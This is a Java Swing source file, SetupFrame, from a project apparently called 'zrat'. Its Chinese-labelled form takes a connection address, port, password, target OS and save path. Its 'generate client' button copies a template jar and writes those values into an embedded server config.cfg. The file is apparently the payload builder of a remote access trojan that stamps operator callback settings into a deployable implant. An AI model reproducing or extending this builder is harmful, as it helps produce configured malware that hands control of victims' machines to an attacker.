package com.zrat.client.ui;

import java.awt.BorderLayout;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

import javax.swing.ButtonGroup;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.WindowConstants;

/**
 * This code was edited or generated using CloudGarden's Jigloo SWT/Swing GUI
 * Builder, which is free for non-commercial use. If Jigloo is being used
 * commercially (ie, by a corporation, company or business for any purpose
 * whatever) then you should purchase a license for each developer using Jigloo.
 * Please visit www.cloudgarden.com for details. Use of Jigloo implies
 * acceptance of these licensing terms. A COMMERCIAL LICENSE HAS NOT BEEN
 * PURCHASED FOR THIS MACHINE, SO JIGLOO OR THIS CODE CANNOT BE USED LEGALLY FOR
 * ANY CORPORATE OR COMMERCIAL PURPOSE.
 */
public class SetupFrame extends javax.swing.JFrame {
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JPanel jPanel;
	private JLabel addressLabel;
	private JTextField addressTextField;
	private JTextField portTextField;
	private JLabel pathLabel;
	private JButton okButton;
	private JButton fileButton;
	private JTextField pathTextField;
	private JRadioButton linuxRB;
	private JRadioButton windowsRB;
	private JLabel osLabel;
	private ButtonGroup buttonGroup;
	private JTextField pwdTextField;
	private JLabel pwdjLabel;
	private JLabel portLabel;
	private JFileChooser fileChooser;

	/**
	 * Auto-generated main method to display this JFrame
	 */
	public static void main(String[] args) {
		SwingUtilities.invokeLater(new Runnable() {
			public void run() {
				SetupFrame inst = new SetupFrame();
				inst.setLocationRelativeTo(null);
				inst.setVisible(true);
			}
		});
	}

	public SetupFrame() {
		super();
		initGUI();
	}

	private void initGUI() {
		try {
			setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
			this.setResizable(false);
			{
				jPanel = new JPanel();
				getContentPane().add(jPanel, BorderLayout.CENTER);
				GridBagLayout jPanelLayout = new GridBagLayout();
				jPanelLayout.rowWeights = new double[] { 0.1, 0.1, 0.1, 0.1,
						0.1, 0.1 };
				jPanelLayout.rowHeights = new int[] { 7, 7, 7, 20, 7, 20 };
				jPanelLayout.columnWeights = new double[] { 0.0, 0.0, 0.1 };
				jPanelLayout.columnWidths = new int[] { 60, 131, 20 };
				jPanel.setLayout(jPanelLayout);
				jPanel.setPreferredSize(new java.awt.Dimension(321, 248));
				{
					addressLabel = new JLabel();
					jPanel.add(addressLabel, new GridBagConstraints(0, 0, 1, 1,
							0.0, 0.0, GridBagConstraints.CENTER,
							GridBagConstraints.NONE, new Insets(0, 5, 0, 5), 0,
							0));
					addressLabel.setText("\u8fde\u63a5\u5730\u5740\uff1a");
				}
				{
					addressTextField = new JTextField();
					jPanel.add(addressTextField, new GridBagConstraints(1, 0,
							2, 1, 0.0, 0.0, GridBagConstraints.WEST,
							GridBagConstraints.NONE, new Insets(0, 5, 0, 5), 0,
							0));
					addressTextField.setPreferredSize(new java.awt.Dimension(
							150, 22));
				}
				{
					portLabel = new JLabel();
					jPanel.add(portLabel, new GridBagConstraints(0, 1, 1, 1,
							0.0, 0.0, GridBagConstraints.CENTER,
							GridBagConstraints.NONE, new Insets(0, 0, 0, 0), 0,
							0));
					portLabel.setText("\u8fde\u63a5\u7aef\u53e3\uff1a");
				}
				{
					portTextField = new JTextField();
					jPanel.add(portTextField, new GridBagConstraints(1, 1, 2,
							1, 0.0, 0.0, GridBagConstraints.WEST,
							GridBagConstraints.NONE, new Insets(0, 5, 0, 5), 0,
							0));
					portTextField.setPreferredSize(new java.awt.Dimension(150,
							22));
				}
				{
					pwdjLabel = new JLabel();
					jPanel.add(pwdjLabel, new GridBagConstraints(0, 2, 1, 1,
							0.0, 0.0, GridBagConstraints.CENTER,
							GridBagConstraints.NONE, new Insets(0, 0, 0, 0), 0,
							0));
					pwdjLabel.setText("\u8fde\u63a5\u5bc6\u7801\uff1a");
				}
				{
					pwdTextField = new JTextField();
					getButtonGroup().add(getWindowsRB());
					getButtonGroup().add(getLinuxRB());
					jPanel.add(pwdTextField, new GridBagConstraints(1, 2, 2, 1,
							0.0, 0.0, GridBagConstraints.WEST,
							GridBagConstraints.NONE, new Insets(0, 5, 0, 5), 0,
							0));
					pwdTextField.setPreferredSize(new java.awt.Dimension(150,
							22));
					jPanel.add(getOsLabel(), new GridBagConstraints(0, 3, 1, 1,
							0.0, 0.0, GridBagConstraints.CENTER,
							GridBagConstraints.NONE, new Insets(0, 0, 0, 0), 0,
							0));
					jPanel.add(getWindowsRB(), new GridBagConstraints(1, 3, 1,
							1, 0.0, 0.0, GridBagConstraints.CENTER,
							GridBagConstraints.NONE, new Insets(0, 0, 0, 5), 0,
							0));
					jPanel.add(getLinuxRB(), new GridBagConstraints(2, 3, 1, 1,
							0.0, 0.0, GridBagConstraints.WEST,
							GridBagConstraints.NONE, new Insets(0, 0, 0, 0), 0,
							0));
					jPanel.add(getPathTextField(), new GridBagConstraints(1, 4,
							2, 1, 0.0, 0.0, GridBagConstraints.WEST,
							GridBagConstraints.NONE, new Insets(0, 5, 0, 0), 0,
							0));
					jPanel.add(getFileButton(), new GridBagConstraints(2, 4, 1,
							1, 0.0, 0.0, GridBagConstraints.EAST,
							GridBagConstraints.NONE, new Insets(0, 5, 0, 5), 0,
							0));
					jPanel.add(getOkButton(), new GridBagConstraints(0, 5, 3,
							1, 0.0, 0.0, GridBagConstraints.CENTER,
							GridBagConstraints.NONE, new Insets(0, 0, 0, 0), 0,
							0));
					jPanel.add(getPathLabel(), new GridBagConstraints(0, 4, 1,
							1, 0.0, 0.0, GridBagConstraints.CENTER,
							GridBagConstraints.NONE, new Insets(0, 0, 0, 0), 0,
							0));
				}
				fileChooser = new JFileChooser();
			}
			pack();
			this.setSize(327, 262);
		} catch (Exception e) {
			// add your error handling code here
			e.printStackTrace();
		}
	}

	private ButtonGroup getButtonGroup() {
		if (buttonGroup == null) {
			buttonGroup = new ButtonGroup();
		}
		return buttonGroup;
	}

	private JLabel getOsLabel() {
		if (osLabel == null) {
			osLabel = new JLabel();
			osLabel.setText("\u64cd\u4f5c\u7cfb\u7edf\uff1a");
		}
		return osLabel;
	}

	private JRadioButton getWindowsRB() {
		if (windowsRB == null) {
			windowsRB = new JRadioButton();
			windowsRB.setText("Windows\u7cfb\u7edf");
		}
		return windowsRB;
	}

	private JRadioButton getLinuxRB() {
		if (linuxRB == null) {
			linuxRB = new JRadioButton();
			linuxRB.setText("Linux\u7cfb\u7edf");
		}
		return linuxRB;
	}

	private JTextField getPathTextField() {
		if (pathTextField == null) {
			pathTextField = new JTextField();
			pathTextField.setPreferredSize(new java.awt.Dimension(200, 22));
		}
		return pathTextField;
	}

	private JButton getFileButton() {
		if (fileButton == null) {
			fileButton = new JButton();
			fileButton.setText("\u9009\u62e9");
			fileButton.addActionListener(new ActionListener() {

				@Override
				public void actionPerformed(ActionEvent arg0) {
					int returnVal = fileChooser.showSaveDialog(fileButton);
					if (returnVal == JFileChooser.APPROVE_OPTION) {
						File file = fileChooser.getSelectedFile();
						pathTextField.setText(file.getAbsolutePath());
					}
				}
			});
		}
		return fileButton;
	}

	private JButton getOkButton() {
		if (okButton == null) {
			okButton = new JButton();
			okButton.setText("\u751f\u6210\u5ba2\u6237\u7aef");
			okButton.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent evt) {
					okButtonActionPerformed(evt);
				}
			});
		}
		return okButton;
	}

	private JLabel getPathLabel() {
		if (pathLabel == null) {
			pathLabel = new JLabel();
			pathLabel.setText("\u4fdd\u5b58\u8def\u5f84\uff1a");
		}
		return pathLabel;
	}

	private void okButtonActionPerformed(ActionEvent evt) {
		Manifest manifest = null;

		String inputFileName = System.getProperty("user.dir") + File.separator
				+ "dat" + File.separator + "app.dat";

		JarInputStream jarIn = null;
		JarOutputStream jarOut = null;
		try {

			jarIn = new JarInputStream(new FileInputStream(inputFileName));

			manifest = jarIn.getManifest();
			
			if (manifest == null) {
				manifest = new Manifest();
			}
			
			jarOut = new JarOutputStream(new FileOutputStream(
					getPathTextField().getText().trim()), manifest);
			byte[] buf = new byte[4096];
			JarEntry entry = null;

			while ((entry = jarIn.getNextJarEntry()) != null) {
				jarOut.putNextEntry(entry);
				int read;
				while ((read = jarIn.read(buf)) != -1) {
					jarOut.write(buf, 0, read);
				}
//				jarOut.closeEntry();
			}
//			jarOut.flush();

			 JarEntry entry2=new JarEntry("com/zrat/server/config.cfg");
			 jarOut.putNextEntry(entry2); 
			 jarOut.write(("address "+addressTextField.getText().trim()+"\n").getBytes());
			 jarOut.write(("port "+portTextField.getText().trim()+"\n").getBytes());
			 jarOut.write(("password "+pwdTextField.getText().trim()+"\n").getBytes());
			 jarOut.closeEntry();
			 jarOut.flush();
//			 jarOut.close(); 
			
			JOptionPane.showMessageDialog(this, "客户端已生成");

		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				if (jarOut != null)
					jarOut.close();
				if (jarIn != null)
					jarIn.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

}
